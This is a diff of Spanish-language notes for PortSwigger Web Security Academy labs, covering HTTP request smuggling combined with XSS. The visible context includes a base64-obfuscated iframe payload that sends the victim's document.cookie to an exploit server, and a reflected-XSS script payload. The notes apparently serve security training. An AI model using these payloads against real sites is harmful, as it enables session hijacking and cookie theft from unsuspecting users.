@@ -2048,10 +2048,11 @@ X-Forwarded-Host: exploit-server-id.web-security-academy.net\
 cambiar el username a carlos y darle a send.\
 
 - Smuggling + XSS en el User Agent
+
 Burp Scanner o extensión Smuggler para encontrar el HTTP Smuggling.\
 Quitar las cabeceras useless como "Sec".\
 Añadir al final de la request generada por Burp (cambiando deatos de URLs y demás):\
-Esta rqeuest es la smuggleada que se mete en la request de visitar un post (POST /?uesnuevecá=<id>)
+Esta rqeuest es la smuggleada que se mete en la request de visitar un post (POST /?uesnuevecá=<id>)\
 ```
 GET /post?postId=4 HTTP/1.1
 Host: <cambiar>.web-security-academy.net
@@ -2068,7 +2069,7 @@ En la barra de búsqueda, checkear TODOS los tags y atributos con el Intruder:\
 ```
 <iframe src="https://acac1f2c1e7f6507c0a71e0c00b100d9.web-security-academy.net/?query=%27%3Cbody%20onhashchange=%22eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXhwbG9pdC1hYzQ0MWY0MDFlZjg2NTkxYzA4ZDFlZGMwMWNlMDBiYy53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvP2M9Jytkb2N1bWVudC5jb29raWU'))%22%3E//"onload="this.onload='';this.src+='#XSS'"></iframe>
 ```
-Si en vez de ?query está el ?searchterm pues también se usa este payload de arriba
+Si en vez de ?query está el ?searchterm pues también se usa este payload de arriba\
 ```
 ?searchterm="><script>alert%281%29<%2Fscript>
 ```
